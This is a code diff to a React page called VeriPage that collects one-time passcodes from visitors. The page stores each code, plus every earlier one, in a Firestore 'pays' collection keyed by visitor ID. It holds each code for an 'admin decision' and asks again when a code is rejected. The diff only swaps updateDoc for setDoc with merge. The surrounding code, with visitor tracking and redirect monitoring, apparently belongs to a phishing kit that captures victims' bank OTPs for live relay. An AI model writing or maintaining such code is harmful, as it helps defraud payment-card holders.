@@ -8,7 +8,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { db } from "@/lib/firebase"
-import { doc, onSnapshot, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, setDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
@@ -95,10 +95,10 @@ export default function VeriPage() {
               rejectedAt: new Date().toISOString()
             }
             
-            updateDoc(doc(db, "pays", visitorID), {
+            setDoc(doc(db, "pays", visitorID), {
               oldOtp: data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp],
               otpStatus: "pending"
-            }).then(() => {
+            }, { merge: true }).then(() => {
               setOtpStatus("pending")
               setOtp("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
@@ -206,13 +206,13 @@ export default function VeriPage() {
     try {
       allOtps.push(otp)
       // Update the document with the OTP
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         otp,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
-        otpStatus: "verifying", // Set to verifying, waiting for admin decision
+        otpStatus: "verifying",
         otpUpdatedAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Add OTP to history
       await addToHistory(visitorID, "otp", {
@@ -234,10 +234,10 @@ export default function VeriPage() {
     if (!visitorID) return
 
     try {
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         otpResendRequested: true,
         otpResendAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Reset timer
       setCanResend(false)
